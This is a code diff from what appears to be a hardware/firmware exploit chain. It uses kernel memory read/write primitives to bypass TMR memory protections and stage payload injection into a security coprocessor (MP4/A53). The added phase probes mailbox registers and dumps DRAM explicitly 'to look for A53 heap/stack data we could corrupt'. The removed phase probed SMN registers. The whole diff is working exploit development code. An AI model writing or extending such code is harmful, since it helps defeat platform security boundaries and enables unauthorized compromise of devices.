@@ -202,32 +202,6 @@ int prosperous_run(void)
         return ret;
     }
 
-    /* Phase 0.5: Quick SMN probe — just 3 reads via B0:D0:F0+0x60/0x64.
-     * Same mechanism TMR code uses. No arrays, minimal code. */
-    printf("\n[*] Phase 0.5: SMN probe...\n");
-    {
-        uint64_t smn_idx = ctx.dmap_base + PCI_B0D0F0 + 0x60;
-        uint64_t smn_dat = ctx.dmap_base + PCI_B0D0F0 + 0x64;
-        uint32_t addr, val;
-
-        /* Verify: read known TMR20 base register */
-        addr = 0x00052080;
-        kernel_copyin(&addr, smn_idx, 4);
-        kernel_copyout(smn_dat, &val, 4);
-        printf("[SMN] 0x%08x = 0x%08x (TMR20, expect ~0x6000)\n", addr, val);
-
-        /* Probe SysHub TLB control area */
-        addr = 0x0003E000;
-        kernel_copyin(&addr, smn_idx, 4);
-        kernel_copyout(smn_dat, &val, 4);
-        printf("[SMN] 0x%08x = 0x%08x\n", addr, val);
-
-        addr = 0x0003F000;
-        kernel_copyin(&addr, smn_idx, 4);
-        kernel_copyout(smn_dat, &val, 4);
-        printf("[SMN] 0x%08x = 0x%08x\n", addr, val);
-    }
-
     /* Phase 1: TMR bypass */
     printf("\n[*] Phase 1: TMR bypass...\n");
 
@@ -237,6 +211,65 @@ int prosperous_run(void)
         return ret;
     }
     printf("[+] TMR 20 disabled, TMR 21 created\n");
+
+    /* Phase 1.5: Attempt writing payload to accessible DRAM and
+     * use c2p mailbox to trigger A53 internal copy.
+     *
+     * Strategy:
+     *   1. Write payload+thunk to accessible DRAM (PA 0x60600000+)
+     *   2. Probe what the stock A53 firmware does with c2p commands
+     *   3. The stock firmware's IRQ handler reads c2p regs when
+     *      triggered by GIC IDs 83/78 — we need to understand
+     *      what commands it accepts natively.
+     *
+     * For now: just verify we can write to accessible DRAM and
+     * read back, then try a single c2p write to see the response.
+     */
+    printf("\n[*] Phase 1.5: Accessible DRAM write + c2p probe...\n");
+    {
+        uint64_t dmap = ctx.dmap_base;
+        uint64_t bar2 = dmap + MP4_BAR2_PA;
+
+        /* Write test pattern to accessible DRAM */
+        uint32_t test_pat = 0xDEADC0DE;
+        kernel_copyin(&test_pat, dmap + 0x60600000ULL, 4);
+        uint32_t readback = 0;
+        kernel_copyout(dmap + 0x60600000ULL, &readback, 4);
+        printf("[DRAM] Write 0xDEADC0DE to PA 0x60600000, read back: 0x%08x %s\n",
+               readback, readback == 0xDEADC0DE ? "OK" : "FAIL");
+
+        /* Read current c2p reg 0 state (don't write to it!) */
+        uint32_t c2p0 = 0;
+        kernel_copyout(bar2 + MP4_C2P_REG(0, 0), &c2p0, 4);
+        printf("[C2P] reg0 = 0x%08x (0=idle)\n", c2p0);
+
+        /* Read all 5 c2p regs for core 0 */
+        for (int r = 0; r < 5; r++) {
+            uint32_t v;
+            kernel_copyout(bar2 + MP4_C2P_REG(0, r), &v, 4);
+            printf("[C2P] core0 reg%d = 0x%08x\n", r, v);
+        }
+
+        /* Read p2c reg for core 0 */
+        uint32_t p2c0;
+        kernel_copyout(bar2 + MP4_P2C_REG0(0), &p2c0, 4);
+        printf("[P2C] core0 reg0 = 0x%08x\n", p2c0);
+
+        /* Dump first 16 bytes of accessible DRAM at several offsets
+         * to look for A53 heap/stack data we could corrupt */
+        uint64_t probe_addrs[] = {
+            0x60600000ULL, 0x60610000ULL, 0x60620000ULL,
+            0x60700000ULL, 0x607E0000ULL, 0x607F0000ULL,
+        };
+        for (int i = 0; i < 6; i++) {
+            uint32_t w[4];
+            for (int j = 0; j < 4; j++)
+                kernel_copyout(dmap + probe_addrs[i] + j*4, &w[j], 4);
+            printf("[DRAM] PA 0x%llx: %08x %08x %08x %08x\n",
+                   (unsigned long long)probe_addrs[i],
+                   w[0], w[1], w[2], w[3]);
+        }
+    }
 
     /* Phase 2: MP4 payload injection */
     printf("\n[*] Phase 2: MP4 payload injection...\n");
